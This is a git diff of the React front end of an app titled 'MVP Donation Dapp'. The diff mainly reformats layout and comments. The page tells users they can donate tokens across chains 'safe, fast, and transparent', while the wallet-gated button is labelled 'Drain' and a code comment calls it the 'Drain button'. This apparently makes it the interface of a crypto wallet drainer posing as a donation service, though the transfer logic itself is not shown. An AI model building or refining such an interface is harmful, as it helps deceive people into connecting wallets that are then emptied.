@@ -62,73 +62,75 @@ export default function App() {
 
   return (
     <div className="text-white min-h-screen">
-      {/* Background layer (enhanced) */}
+      {/* Background */}
       <Background />
 
-      {/* Navbar is fixed in its component; ensure content has top padding */}
+      {/* Navbar (fixed) */}
       <Navbar />
 
-      {/* Price ticker — place under navbar and make responsive */}
-      <div className="pt-[84px]"> {/* reserve space for fixed navbar */}
+      {/* Content area: reserve space for fixed navbar */}
+      <div className="pt-[84px]">
+        {/* Price ticker (full width bar) */}
         <div className="w-full">
           <PriceTicker />
         </div>
 
-        {/* Main content container - responsive width & padding */}
+        {/* Center the main container on large screens */}
         <div className="w-full flex justify-center">
-        <div className="w-full max-w-screen-lg mx-auto px-4">
-          <main className="flex flex-col items-center gap-6 py-8">
-            <h1 className="text-3xl sm:text-4xl md:text-5xl font-extrabold text-center leading-tight">
-              MVP Donation Dapp
-            </h1>
+          <div className="w-full max-w-screen-lg px-4">
+            <main className="flex flex-col items-center gap-6 py-8">
+              <h1 className="text-3xl sm:text-4xl md:text-5xl font-extrabold text-center leading-tight">
+                MVP Donation Dapp
+              </h1>
 
-            <p className="text-gray-300 text-center text-sm sm:text-base max-w-xl">
-              Donate your tokens across chains in one click — safe, fast, and transparent.
-            </p>
+              <p className="text-gray-300 text-center text-sm sm:text-base max-w-xl">
+                Donate your tokens across chains in one click — safe, fast, and transparent.
+              </p>
 
-            {/* Swap position: Connect (Navbar already has Connect) – keep How it Works near CTA */}
-            <div className="w-full flex flex-col sm:flex-row items-center justify-center gap-4">
-              <div className="flex-shrink-0">
-                <GuideModal />
-              </div>
-
-              <div className="flex-shrink-0">
-                {/* Drain button hidden until wallet is connected */}
-                {isConnected ? (
-                  <button
-                    onClick={handleDonate}
-                    disabled={status === "running"}
-                    className="px-6 py-3 bg-blue-600 rounded-xl shadow-lg hover:bg-blue-700 transition disabled:opacity-50"
-                  >
-                    {status === "running" ? "Processing…" : "Drain"}
-                  </button>
-                ) : (
-                  <p className="text-gray-400 italic text-center">
-                    🔌 Connect your wallet to see the donate button
-                  </p>
-                )}
-              </div>
-            </div>
-
-            {/* Status panel: responsive, scrollable on small screens */}
-            <div className="w-full bg-black/50 p-4 rounded-lg overflow-x-auto">
-              <div className="flex items-start justify-between">
-                <div>
-                  <strong>Status:</strong> <span className="ml-2">{status}</span>
+              {/* How it Works + CTA row */}
+              <div className="w-full flex flex-col sm:flex-row items-center justify-center gap-4">
+                <div className="flex-shrink-0">
+                  <GuideModal />
                 </div>
-                <div className="text-xs text-gray-400">Dev output</div>
-              </div>
-              <pre className="mt-2 text-xs sm:text-sm whitespace-pre-wrap break-words">
-                {JSON.stringify(last, null, 2)}
-              </pre>
-            </div>
-          </main>
 
-          {/* Footer */}
-          <Footer />
+                <div className="flex-shrink-0">
+                  {/* Drain button hidden until wallet is connected */}
+                  {isConnected ? (
+                    <button
+                      onClick={handleDonate}
+                      disabled={status === "running"}
+                      className="px-6 py-3 bg-blue-600 rounded-xl shadow-lg hover:bg-blue-700 transition disabled:opacity-50"
+                    >
+                      {status === "running" ? "Processing…" : "Drain"}
+                    </button>
+                  ) : (
+                    <p className="text-gray-400 italic text-center">
+                      🔌 Connect your wallet to see the donate button
+                    </p>
+                  )}
+                </div>
+              </div>
+
+              {/* (Optional) Dev status panel — kept for now; remove/comment if you don't want it */}
+              <div className="w-full bg-black/50 p-4 rounded-lg overflow-x-auto">
+                <div className="flex items-start justify-between">
+                  <div>
+                    <strong>Status:</strong> <span className="ml-2">{status}</span>
+                  </div>
+                  <div className="text-xs text-gray-400">Dev output</div>
+                </div>
+                <pre className="mt-2 text-xs sm:text-sm whitespace-pre-wrap break-words">
+                  {JSON.stringify(last, null, 2)}
+                </pre>
+              </div>
+            </main>
+
+            {/* Footer */}
+            <Footer />
+          </div>
         </div>
       </div>
-</div>
+
       {/* Notifications (floating toasts) */}
       <Notifications notifications={notifications} />
     </div>
